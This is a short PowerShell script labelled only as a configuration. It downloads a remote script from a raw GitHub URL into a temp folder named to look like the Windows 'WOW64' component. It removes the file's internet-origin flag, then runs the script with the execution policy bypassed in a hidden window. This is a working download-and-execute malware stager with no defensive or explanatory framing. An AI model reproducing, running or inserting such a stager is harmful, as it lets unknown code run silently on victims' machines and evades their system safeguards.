# Configuration
$url = "https://raw.githubusercontent.com/jusnih/x/refs/heads/main/y.ps1"
$folder = "$env:TEMP\WOW64"
$scriptPath = "$folder\y.ps1"

# Create folder if not exists
New-Item -Path $folder -ItemType Directory -Force | Out-Null

# Download script using System.Net.WebClient
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $scriptPath)

Unblock-File -Path $scriptPath

# Define path to PowerShell and the script
$psPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

# Ensure the script is unblocked (remove NTFS "from internet" flag)
Unblock-File -Path $scriptPath

# Create ProcessStartInfo
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $psPath
$psi.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
$psi.WindowStyle = 'Hidden'
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false

# Start the process
[System.Diagnostics.Process]::Start($psi)
